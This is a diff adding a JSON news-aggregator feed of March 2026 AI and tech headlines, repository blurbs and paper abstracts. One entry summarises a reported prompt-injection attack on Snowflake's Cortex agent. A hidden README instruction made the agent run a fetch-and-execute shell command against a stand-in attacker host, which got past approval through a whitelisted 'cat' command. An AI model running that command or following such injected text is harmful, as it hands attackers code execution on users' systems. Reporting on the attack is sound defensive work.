@@ -1,0 +1,550 @@
+[
+  {
+    "source": "GitHub Trending",
+    "category": "tools",
+    "title": "jarrodwatts/claude-hud",
+    "url": "https://github.com/jarrodwatts/claude-hud",
+    "time": "2026-03-19T00:02:05.759757+00:00",
+    "summary": "A Claude Code plugin that shows what's happening - context usage, active tools, running agents, and todo progress",
+    "readme": "# Claude HUD\n\nA Claude Code plugin that shows what's happening — context usage, active tools, running agents, and todo progress. Always visible below your input.\n\n[![License](https://img.shields.io/github/license/jarrodwatts/claude-hud?v=2)](LICENSE)\n[![Stars](https://img.shields.io/github/stars/jarrodwatts/claude-hud)](https://github.com/jarrodwatts/claude-hud/stargazers)\n\n![Claude HUD in action](claude-hud-preview-5-2.png)\n\n## Install\n\nInside a Claude Code instance, run the following commands:",
+    "github_url": "https://github.com/jarrodwatts/claude-hud",
+    "lang": "JavaScript",
+    "stars": "6894"
+  },
+  {
+    "source": "GitHub Trending",
+    "category": "tools",
+    "title": "unslothai/unsloth",
+    "url": "https://github.com/unslothai/unsloth",
+    "time": "2026-03-19T00:02:05.630336+00:00",
+    "summary": "Unified web UI for training and running open models like Qwen, DeepSeek, gpt-oss and Gemma locally.",
+    "readme": "<h1 align=\"center\" style=\"margin:0;\">\n  <a href=\"https://unsloth.ai/docs\"><picture>\n    <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://raw.githubusercontent.com/unslothai/unsloth/main/images/STUDIO%20WHITE%20LOGO.png\">\n    <source media=\"(prefers-color-scheme: light)\" srcset=\"https://raw.githubusercontent.com/unslothai/unsloth/main/images/STUDIO%20BLACK%20LOGO.png\">\n    <img alt=\"Unsloth logo\" src=\"https://raw.githubusercontent.com/unslothai/unsloth/main/images/STUDIO%20BLACK%20LOG",
+    "github_url": "https://github.com/unslothai/unsloth",
+    "lang": "Python",
+    "stars": "55776"
+  },
+  {
+    "source": "GitHub Trending",
+    "category": "tools",
+    "title": "langchain-ai/open-swe",
+    "url": "https://github.com/langchain-ai/open-swe",
+    "time": "2026-03-19T00:02:05.528233+00:00",
+    "summary": "An Open-Source Asynchronous Coding Agent",
+    "readme": "<div align=\"center\">\n  <a href=\"https://github.com/langchain-ai/open-swe\">\n    <picture>\n      <source media=\"(prefers-color-scheme: dark)\" srcset=\"static/dark.svg\">\n      <source media=\"(prefers-color-scheme: light)\" srcset=\"static/light.svg\">\n      <img alt=\"Open SWE Logo\" src=\"static/dark.svg\" width=\"35%\">\n    </picture>\n  </a>\n</div>\n\n<div align=\"center\">\n  <h3>Open-source framework for building your org's internal coding agent.</h3>\n</div>\n\n<div align=\"center\">\n  <a href=\"https://opensource",
+    "github_url": "https://github.com/langchain-ai/open-swe",
+    "lang": "Python",
+    "stars": "6317"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Warranty Void If Regenerated",
+    "url": "https://news.ycombinator.com/item?id=47431237",
+    "time": "2026-03-18T20:45:54Z",
+    "heat": "143",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47431237"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Stop spending money on Claude, Chipotle's chat bot is free",
+    "url": "https://news.ycombinator.com/item?id=47428987",
+    "time": "2026-03-18T17:54:41Z",
+    "heat": "25",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47428987"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Show HN: Tmux-IDE, OSS agent-first terminal IDE",
+    "url": "https://news.ycombinator.com/item?id=47428868",
+    "time": "2026-03-18T17:46:25Z",
+    "heat": "56",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47428868"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "EU Inc.: A new harmonised corporate legal regime",
+    "url": "https://news.ycombinator.com/item?id=47428810",
+    "time": "2026-03-18T17:42:10Z",
+    "heat": "107",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47428810"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "AI chatbots often validate delusions and suicidal thoughts, study finds",
+    "url": "https://news.ycombinator.com/item?id=47428718",
+    "time": "2026-03-18T17:34:50Z",
+    "heat": "27",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47428718"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "AI coding is gambling",
+    "url": "https://news.ycombinator.com/item?id=47428541",
+    "time": "2026-03-18T17:22:02Z",
+    "heat": "300",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47428541"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Americans Recognize AI as a Wealth Inequality Machine, Polls Find",
+    "url": "https://news.ycombinator.com/item?id=47428335",
+    "time": "2026-03-18T17:07:21Z",
+    "heat": "52",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47428335"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Government backtracks on AI and copyright after outcry from major artists",
+    "url": "https://news.ycombinator.com/item?id=47427698",
+    "time": "2026-03-18T16:21:50Z",
+    "heat": "28",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47427698"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Google Engineers Launch \"Sashiko\" for Agentic AI Code Review of the Linux Kernel",
+    "url": "https://news.ycombinator.com/item?id=47427647",
+    "time": "2026-03-18T16:17:44Z",
+    "heat": "89",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47427647"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Daemons that clean up the mess agents leave behind",
+    "url": "https://news.ycombinator.com/item?id=47427279",
+    "time": "2026-03-18T15:48:49Z",
+    "heat": "18",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47427279"
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "Meta is having trouble with rogue AI agents",
+    "url": "https://techcrunch.com/2026/03/18/meta-is-having-trouble-with-rogue-ai-agents/",
+    "time": "2026-03-18T15:42:46+00:00",
+    "summary": "A rogue AI agent inadvertently exposed Meta company and user data to engineers who didn't have permission to see it."
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Snowflake AI Escapes Sandbox and Executes Malware",
+    "url": "https://news.ycombinator.com/item?id=47427017",
+    "time": "2026-03-18T15:30:07Z",
+    "heat": "224",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47427017"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Petition to Node.js TSC: No AI Code in Node.js Core",
+    "url": "https://news.ycombinator.com/item?id=47426948",
+    "time": "2026-03-18T15:25:08Z",
+    "heat": "11",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47426948"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Aliens.gov ~ domain registered 17MAR2026",
+    "url": "https://news.ycombinator.com/item?id=47425680",
+    "time": "2026-03-18T13:39:05Z",
+    "heat": "139",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47425680"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "FDA links raw cheese to outbreak; Makers \"100% disagree,\" refuse recall",
+    "url": "https://news.ycombinator.com/item?id=47425607",
+    "time": "2026-03-18T13:32:48Z",
+    "heat": "49",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47425607"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Trevor Milton is raising funds for a new jet he claims will transform flying",
+    "url": "https://news.ycombinator.com/item?id=47425176",
+    "time": "2026-03-18T12:52:47Z",
+    "heat": "78",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47425176"
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "Nothing CEO Carl Pei says smartphone apps will disappear as AI agents take their place",
+    "url": "https://techcrunch.com/2026/03/18/nothing-ceo-carl-pei-says-smartphone-apps-will-disappear-as-ai-agents-take-their-place/",
+    "time": "2026-03-18T12:30:52+00:00",
+    "summary": "Nothing CEO Carl Pei says AI agents will eventually replace apps, shifting smartphones toward systems that understand intent and act on a user's behalf."
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Your Agents.md is probably too long",
+    "url": "https://news.ycombinator.com/item?id=47424426",
+    "time": "2026-03-18T11:41:05Z",
+    "heat": "14",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47424426"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "OpenAI Has New Focus (on the IPO)",
+    "url": "https://news.ycombinator.com/item?id=47423976",
+    "time": "2026-03-18T10:49:19Z",
+    "heat": "128",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47423976"
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "Patreon CEO calls AI companies’ fair use argument ‘bogus,’ says creators should be paid",
+    "url": "https://techcrunch.com/2026/03/18/patreon-ceo-calls-ai-companies-fair-use-argument-bogus-says-creators-should-be-paid/",
+    "time": "2026-03-18T09:54:31+00:00",
+    "summary": "Patreon CEO Jack Conte says AI companies should pay creators for training data, arguing their fair use defense falls apart when they license content from major publishers."
+  },
+  {
+    "source": "Simon Willison",
+    "category": "tools",
+    "title": "Snowflake Cortex AI Escapes Sandbox and Executes Malware",
+    "url": "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything",
+    "time": "2026-03-18T09:43:49+00:00",
+    "summary": "Snowflake Cortex AI Escapes Sandbox and Executes Malware\nPromptArmor report on a prompt injection attack chain in Snowflake's Cortex Agent, now fixed.\nThe attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.\nThe attack caused the agent to execute this code:\ncat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))\n\nCortex listed cat commands as safe to run without human approval, without protecting"
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "Rebel Audio is a new AI podcasting tool aimed at first-time creators",
+    "url": "https://techcrunch.com/2026/03/18/rebel-audio-is-a-new-ai-podcasting-tool-aimed-at-first-time-creators/",
+    "time": "2026-03-18T09:15:00+00:00",
+    "summary": "Rebel Audio is a new all-in-one podcasting tool that allows creators to record podcasts, edit, clip content for social, and publish episodes, all without ever leaving the platform."
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "The Gemini-powered features in Google Workspace that are worth using",
+    "url": "https://techcrunch.com/2026/03/18/the-gemini-powered-features-in-google-workspace-that-are-worth-using/",
+    "time": "2026-03-18T08:43:18+00:00",
+    "summary": "From summarizing emails, drafting content, organizing data, and tracking meetings, here are all the best Gemini features in Google Workspace."
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "This startup wants to make enterprise software look more like a prompt",
+    "url": "https://techcrunch.com/2026/03/18/this-startup-wants-to-make-enterprise-software-look-more-like-a-prompt/",
+    "time": "2026-03-18T08:00:00+00:00",
+    "summary": "The company has raised $12 million in seed funding to build an AI operating system for enterprise."
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "Sequen snags $16M to bring TikTok-style personalization tech to any consumer company",
+    "url": "https://techcrunch.com/2026/03/18/sequen-snags-16m-to-bring-tiktok-style-personalization-tech-to-any-consumer-company/",
+    "time": "2026-03-18T07:58:50+00:00",
+    "summary": "With its Series A, Sequen is bringing its proprietary AI ranking and personalization technology to large consumer business."
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "Microsoft hires the team of Sequoia-backed AI collaboration platform, Cove",
+    "url": "https://techcrunch.com/2026/03/18/microsoft-hires-the-team-of-sequioa-backed-ai-collaboration-platform-cove/",
+    "time": "2026-03-18T07:33:49+00:00",
+    "summary": "AI collaboration startup Cove is shutting down after its team joined Microsoft, with service ending April 1 and customer data set for deletion."
+  },
+  {
+    "source": "AI News",
+    "category": "announcements",
+    "title": "Mastercard keeps tabs on fraud with new foundation model",
+    "url": "https://www.artificialintelligence-news.com/news/mastercards-ltm-keeps-tabs-on-fraud-with-a-new-foundation-model/",
+    "time": "2026-03-18T07:31:00+00:00",
+    "summary": "Mastercard has developed a large tabular model (an LTM as opposed to an LLM) that’s trained on transaction data rather than text or images to help it address security and authenticity issues in digital payments. The company has trained a foundation model on billions of card transactions, with the intention of expanding to hundreds of […]\nThe post Mastercard keeps tabs on fraud with new foundation model appeared first on AI News."
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "The PhD students who became the judges of the AI industry",
+    "url": "https://techcrunch.com/podcast/the-phd-students-who-became-the-judges-of-the-ai-industry/",
+    "time": "2026-03-18T07:00:00+00:00",
+    "summary": "Artificial intelligence models are multiplying fast, and competition is stiff. With so many players crowding the space, which one will be the best — and who decides that? Arena, formerly LM Arena, has emerged as the de facto public leaderboard for frontier LLMs, influencing funding, launches, and PR cycles. In just seven months, the startup went from a UC Berkeley PhD research […]"
+  },
+  {
+    "source": "AI News",
+    "category": "announcements",
+    "title": "For effective AI, insurance needs to get its data house in order",
+    "url": "https://www.artificialintelligence-news.com/news/for-effective-ai-insurance-needs-a-better-data-layer-and-integration/",
+    "time": "2026-03-18T06:37:00+00:00",
+    "summary": "A report from Autorek, a provider of AI solutions to the insurance industry has produced a report that describes operational drag in companies’ internal processes that not only affect overall efficiency but cause an impediment to the effective implementation of AI in insurance concerns. Insurance Operations & Financial Transformation 2026 [email wall] draws from a […]\nThe post For effective AI, insurance needs to get its data house in order appeared first on AI News."
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "DeepSeek by Hand in Excel",
+    "url": "https://news.ycombinator.com/item?id=47422151",
+    "time": "2026-03-18T06:21:03Z",
+    "heat": "13",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47422151"
+  },
+  {
+    "source": "TechCrunch AI",
+    "category": "industry",
+    "title": "DOD says Anthropic’s ‘red lines’ make it an ‘unacceptable risk to national security’",
+    "url": "https://techcrunch.com/2026/03/18/dod-says-anthropics-red-lines-make-it-an-unacceptable-risk-to-national-security/",
+    "time": "2026-03-18T05:40:43+00:00",
+    "summary": "The Defense Department said concerns that Anthropic might \"attempt to disable its technology\" during \"warfighting operations\" validate its decision to label the AI firm a supply-chain risk."
+  },
+  {
+    "source": "Interconnects",
+    "category": "industry",
+    "title": "GPT 5.4 is a big step for Codex",
+    "url": "https://www.interconnects.ai/p/gpt-54-is-a-big-step-for-codex",
+    "time": "2026-03-18T05:02:54+00:00",
+    "summary": "On evaluating and understanding the frontier of agents, and why I still turn to Claude."
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "UC Irvine researchers bring down AI powered drones with painted umbrellas",
+    "url": "https://news.ycombinator.com/item?id=47420697",
+    "time": "2026-03-18T01:42:29Z",
+    "heat": "22",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47420697"
+  },
+  {
+    "source": "Hacker News",
+    "category": "community",
+    "title": "Launch an autonomous AI agent with sandboxed execution in 2 lines of code",
+    "url": "https://news.ycombinator.com/item?id=47420493",
+    "time": "2026-03-18T01:10:19Z",
+    "heat": "52",
+    "summary": "",
+    "hn_url": "https://news.ycombinator.com/item?id=47420493"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "SparkVSR: Interactive Video Super-Resolution via Sparse Keyframe Propagation",
+    "url": "https://huggingface.co/papers/2603.16864",
+    "time": "2026-03-17T17:59:30.000Z",
+    "summary": "Video Super-Resolution (VSR) aims to restore high-quality video frames from low-resolution (LR) estimates, yet most existing VSR approaches behave like black boxes at inference time: users cannot reliably correct unexpected artifacts, but instead can only accept whatever the model produces. In this paper, we propose a novel interactive VSR framework dubbed SparkVSR that makes sparse keyframes a simple and expressive control signal. Specifically, users can first super-resolve or optionally a smal",
+    "heat": "11",
+    "github_url": "https://arxiv.org/abs/2603.16864"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "V-Co: A Closer Look at Visual Representation Alignment via Co-Denoising",
+    "url": "https://huggingface.co/papers/2603.16792",
+    "time": "2026-03-17T17:01:54.000Z",
+    "summary": "Pixel-space diffusion has recently re-emerged as a strong alternative to latent diffusion, enabling high-quality generation without pretrained autoencoders. However, standard pixel-space diffusion models receive relatively weak semantic supervision and are not explicitly designed to capture high-level visual structure. Recent representation-alignment methods (e.g., REPA) suggest that pretrained visual features can substantially improve diffusion training, and visual co-denoising has emerged as a",
+    "heat": "2",
+    "github_url": "https://arxiv.org/abs/2603.16792"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Mixture of Style Experts for Diverse Image Stylization",
+    "url": "https://huggingface.co/papers/2603.16649",
+    "time": "2026-03-17T15:20:19.000Z",
+    "summary": "Diffusion-based stylization has advanced significantly, yet existing methods are limited to color-driven transformations, neglecting complex semantics and material details.We introduce StyleExpert, a semantic-aware framework based on the Mixture of Experts (MoE). Our framework employs a unified style encoder, trained on our large-scale dataset of content-style-stylized triplets, to embed diverse styles into a consistent latent space. This embedding is then used to condition a similarity-aware ga",
+    "heat": "2",
+    "github_url": "https://arxiv.org/abs/2603.16649"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "HistoAtlas: A Pan-Cancer Morphology Atlas Linking Histomics to Molecular Programs and Clinical Outcomes",
+    "url": "https://huggingface.co/papers/2603.16587",
+    "time": "2026-03-17T14:36:07.000Z",
+    "summary": "We present HistoAtlas, a pan-cancer computational atlas that extracts 38 interpretable histomic features from 6,745 diagnostic H&E slides across 21 TCGA cancer types and systematically links every feature to survival, gene expression, somatic mutations, and immune subtypes. All associations are covariate-adjusted, multiple-testing corrected, and classified into evidence-strength tiers. The atlas recovers known biology, from immune infiltration and prognosis to proliferation and kinase signaling,",
+    "heat": "",
+    "github_url": "https://arxiv.org/abs/2603.16587"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Omnilingual MT: Machine Translation for 1,600 Languages",
+    "url": "https://huggingface.co/papers/2603.16309",
+    "time": "2026-03-17T09:43:42.000Z",
+    "summary": "High-quality machine translation (MT) can scale to hundreds of languages, setting a high bar for multilingual systems. However, compared to the world's 7,000 languages, current systems still offer only limited coverage: about 200 languages on the target side, and maybe a few hundreds more on the source side, supported due to cross-lingual transfer. And even these numbers have been hard to evaluate due to the lack of reliable benchmarks and metrics.\n  We present Omnilingual Machine Translation (O",
+    "heat": "6",
+    "github_url": "https://arxiv.org/abs/2603.16309"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "MDM-Prime-v2: Binary Encoding and Index Shuffling Enable Compute-optimal Scaling of Diffusion Language Models",
+    "url": "https://huggingface.co/papers/2603.16077",
+    "time": "2026-03-17T02:54:16.000Z",
+    "summary": "Masked diffusion models (MDM) exhibit superior generalization when learned using a Partial masking scheme (Prime). This approach converts tokens into sub-tokens and models the diffusion process at the sub-token level. We identify two limitations of the MDM-Prime framework. First, we lack tools to guide the hyperparameter choice of the token granularity in the subtokenizer. Second, we find that the function form of the subtokenizer significantly degrades likelihood estimation when paired with com",
+    "heat": "1",
+    "github_url": "https://arxiv.org/abs/2603.16077"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "ARISE: Agent Reasoning with Intrinsic Skill Evolution in Hierarchical Reinforcement Learning",
+    "url": "https://huggingface.co/papers/2603.16060",
+    "time": "2026-03-17T02:03:17.000Z",
+    "summary": "The dominant paradigm for improving mathematical reasoning in language models relies on Reinforcement Learning with verifiable rewards. Yet existing methods treat each problem instance in isolation without leveraging the reusable strategies that emerge and accumulate during training. To this end, we introduce ARISE (Agent Reasoning via Intrinsic Skill Evolution), a hierarchical reinforcement learning framework, in which a shared policy operates both to manage skills at high-level and to generate",
+    "heat": "",
+    "github_url": "https://arxiv.org/abs/2603.16060"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Residual Stream Duality in Modern Transformer Architectures",
+    "url": "https://huggingface.co/papers/2603.16039",
+    "time": "2026-03-17T00:56:29.000Z",
+    "summary": "Recent work has made clear that the residual pathway is not mere optimization plumbing; it is part of the model's representational machinery. We agree, but argue that the cleanest way to organize this design space is through a two-axis view of the Transformer. A decoder evolves information along two ordered dimensions: sequence position and layer depth. Self-attention already provides adaptive mixing along the sequence axis, whereas the residual stream usually performs fixed addition along the d",
+    "heat": "1",
+    "github_url": "https://arxiv.org/abs/2603.16039"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "WiT: Waypoint Diffusion Transformers via Trajectory Conflict Navigation",
+    "url": "https://huggingface.co/papers/2603.15132",
+    "time": "2026-03-16T11:25:09.000Z",
+    "summary": "While recent Flow Matching models avoid the reconstruction bottlenecks of latent autoencoders by operating directly in pixel space, the lack of semantic continuity in the pixel manifold severely intertwines optimal transport paths. This induces severe trajectory conflicts near intersections, yielding sub-optimal solutions. Rather than bypassing this issue via information-lossy latent representations, we directly untangle the pixel-space trajectories by proposing Waypoint Diffusion Transformers (",
+    "heat": "28",
+    "github_url": "https://arxiv.org/abs/2603.15132"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "VAREX: A Benchmark for Multi-Modal Structured Extraction from Documents",
+    "url": "https://huggingface.co/papers/2603.15118",
+    "time": "2026-03-16T11:15:56.000Z",
+    "summary": "We introduce VAREX (VARied-schema EXtraction), a benchmark for evaluating multimodal foundation models on structured data extraction from government forms. VAREX employs a Reverse Annotation pipeline that programmatically fills PDF templates with synthetic values, producing deterministic ground truth validated through three-phase quality assurance. The benchmark comprises 1,777 documents with 1,771 unique schemas across three structural categories, each provided in four input modalities: plain t",
+    "heat": "",
+    "github_url": "https://arxiv.org/abs/2603.15118"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Chain-of-Trajectories: Unlocking the Intrinsic Generative Optimality of Diffusion Models via Graph-Theoretic Planning",
+    "url": "https://huggingface.co/papers/2603.14704",
+    "time": "2026-03-16T01:28:51.000Z",
+    "summary": "Diffusion models operate in a reflexive System 1 mode, constrained by a fixed, content-agnostic sampling schedule. This rigidity arises from the curse of state dimensionality, where the combinatorial explosion of possible states in the high-dimensional noise manifold renders explicit trajectory planning intractable and leads to systematic computational misallocation. To address this, we introduce Chain-of-Trajectories (CoTj), a train-free framework enabling System 2 deliberative planning. Centra",
+    "heat": "",
+    "github_url": "https://arxiv.org/abs/2603.14704"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "SuperLocalMemory V3: Information-Geometric Foundations for Zero-LLM Enterprise Agent Memory",
+    "url": "https://huggingface.co/papers/2603.14588",
+    "time": "2026-03-15T20:20:54.000Z",
+    "summary": "Persistent memory is a central capability for AI agents, yet the mathematical foundations of memory retrieval, lifecycle management, and consistency remain unexplored. Current systems employ cosine similarity for retrieval, heuristic decay for salience, and provide no formal contradiction detection.\n  We establish information-geometric foundations through three contributions. First, a retrieval metric derived from the Fisher information structure of diagonal Gaussian families, satisfying Riemann",
+    "heat": "1",
+    "github_url": "https://arxiv.org/abs/2603.14588"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "ECG-Reasoning-Benchmark: A Benchmark for Evaluating Clinical Reasoning Capabilities in ECG Interpretation",
+    "url": "https://huggingface.co/papers/2603.14326",
+    "time": "2026-03-15T11:09:38.000Z",
+    "summary": "While Multimodal Large Language Models (MLLMs) show promising performance in automated electrocardiogram interpretation, it remains unclear whether they genuinely perform actual step-by-step reasoning or just rely on superficial visual cues. To investigate this, we introduce ECG-Reasoning-Benchmark, a novel multi-turn evaluation framework comprising over 6,400 samples to systematically assess step-by-step reasoning across 17 core ECG diagnoses. Our comprehensive evaluation of state-of-the-art mo",
+    "heat": "1",
+    "github_url": "https://arxiv.org/abs/2603.14326"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "GradMem: Learning to Write Context into Memory with Test-Time Gradient Descent",
+    "url": "https://huggingface.co/papers/2603.13875",
+    "time": "2026-03-14T10:17:33.000Z",
+    "summary": "Many large language model applications require conditioning on long contexts. Transformers typically support this by storing a large per-layer KV-cache of past activations, which incurs substantial memory overhead. A desirable alternative is ompressive memory: read a context once, store it in a compact state, and answer many queries from that state. We study this in a context removal setting, where the model must generate an answer without access to the original context at inference time. We int",
+    "heat": "19",
+    "github_url": "https://arxiv.org/abs/2603.13875"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "BERTology of Molecular Property Prediction",
+    "url": "https://huggingface.co/papers/2603.13627",
+    "time": "2026-03-13T22:18:22.000Z",
+    "summary": "Chemical language models (CLMs) have emerged as promising competitors to popular classical machine learning models for molecular property prediction (MPP) tasks. However, an increasing number of studies have reported inconsistent and contradictory results for the performance of CLMs across various MPP benchmark tasks. In this study, we conduct and analyze hundreds of meticulously controlled experiments to systematically investigate the effects of various factors, such as dataset size, model size",
+    "heat": "",
+    "github_url": "https://arxiv.org/abs/2603.13627"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Theoretical Foundations of Latent Posterior Factors: Formal Guarantees for Multi-Evidence Reasoning",
+    "url": "https://huggingface.co/papers/2603.15674",
+    "time": "2026-03-13T17:44:14.000Z",
+    "summary": "We present a complete theoretical characterization of Latent Posterior Factors (LPF), a principled framework for aggregating multiple heterogeneous evidence items in probabilistic prediction tasks. Multi-evidence reasoning arises pervasively in high-stakes domains including healthcare diagnosis, financial risk assessment, legal case analysis, and regulatory compliance, yet existing approaches either lack formal guarantees or fail to handle multi-evidence scenarios architecturally. LPF encodes ea",
+    "heat": "1",
+    "github_url": "https://arxiv.org/abs/2603.15674"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "I Know What I Don't Know: Latent Posterior Factor Models for Multi-Evidence Probabilistic Reasoning",
+    "url": "https://huggingface.co/papers/2603.15670",
+    "time": "2026-03-13T10:05:14.000Z",
+    "summary": "Real-world decision-making, from tax compliance assessment to medical diagnosis, requires aggregating multiple noisy and potentially contradictory evidence sources. Existing approaches either lack explicit uncertainty quantification (neural aggregation methods) or rely on manually engineered discrete predicates (probabilistic logic frameworks), limiting scalability to unstructured data.\n  We introduce Latent Posterior Factors (LPF), a framework that transforms Variational Autoencoder (VAE) laten",
+    "heat": "1",
+    "github_url": "https://arxiv.org/abs/2603.15670"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Sparking Scientific Creativity via LLM-Driven Interdisciplinary Inspiration",
+    "url": "https://huggingface.co/papers/2603.12226",
+    "time": "2026-03-12T17:48:34.000Z",
+    "summary": "Despite interdisciplinary research leading to larger and longer-term impact, most work remains confined to single-domain academic silos. Recent AI-based approaches to scientific discovery show promise for interdisciplinary research, but many prioritize rapidly designing experiments and solutions, bypassing the exploratory, collaborative reasoning processes that drive creative interdisciplinary breakthroughs. As a result, prior efforts largely prioritize automating scientific discovery rather tha",
+    "heat": "2",
+    "github_url": "https://arxiv.org/abs/2603.12226"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "Qianfan-OCR: A Unified End-to-End Model for Document Intelligence",
+    "url": "https://huggingface.co/papers/2603.13398",
+    "time": "2026-03-11T16:08:22.000Z",
+    "summary": "We present Qianfan-OCR, a 4B-parameter end-to-end vision-language model that unifies document parsing, layout analysis, and document understanding within a single architecture. It performs direct image-to-Markdown conversion and supports diverse prompt-driven tasks including table extraction, chart understanding, document QA, and key information extraction. To address the loss of explicit layout analysis in end-to-end OCR, we propose Layout-as-Thought, an optional thinking phase triggered by spe",
+    "heat": "81",
+    "github_url": "https://arxiv.org/abs/2603.13398"
+  },
+  {
+    "source": "HuggingFace Papers",
+    "category": "research",
+    "title": "MEMO: Memory-Augmented Model Context Optimization for Robust Multi-Turn Multi-Agent LLM Games",
+    "url": "https://huggingface.co/papers/2603.09022",
+    "time": "2026-03-09T23:36:32.000Z",
+    "summary": "Multi-turn, multi-agent LLM game evaluations often exhibit substantial run-to-run variance. In long-horizon interactions, small early deviations compound across turns and are amplified by multi-agent coupling. This biases win rate estimates and makes rankings unreliable across repeated tournaments. Prompt choice worsens this further by producing different effective policies. We address both instability and underperformance with MEMO (Memory-augmented MOdel context optimization), a self-play fram",
+    "heat": "19",
+    "github_url": "https://arxiv.org/abs/2603.09022"
+  }
+]
